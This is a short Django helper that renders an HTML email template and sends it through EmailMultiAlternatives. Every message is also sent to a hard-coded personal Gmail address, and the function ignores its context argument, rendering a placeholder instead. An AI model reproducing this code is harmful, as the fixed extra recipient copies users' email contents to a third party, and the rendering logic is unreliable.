# from notice_project.config.settings.base import EMAIL_HOST
# from django.template.loader import get_template
# from django.template import Context
from django.core.mail import EmailMultiAlternatives
from django.conf import settings
from django.template.loader import render_to_string
from django.utils.html import strip_tags


def sendemail(template, context, subject, to):
    subject, from_email, to = subject, settings.SES_EMAIL, to
    html_content = render_to_string(template, {'varname':'value'}) # render with dynamic value
    text_content = strip_tags(html_content) # Strip the html tag. So people can see the pure text at least.

    try:
        msg = EmailMultiAlternatives(subject=subject, from_email=from_email, to=[to,"emmanuelcharles2133@gmail.com"])
        msg.attach_alternative(html_content, "text/html")
        msg.send(fail_silently=False)
        return True
    except Exception as e:
        print('There was an error sending an email: ', e) 
        # error = {'message': ",".join(e.args) if len(e.args) > 0 else 'Unknown Error'}
        return False
        # raise serializers.ValidationError(error)


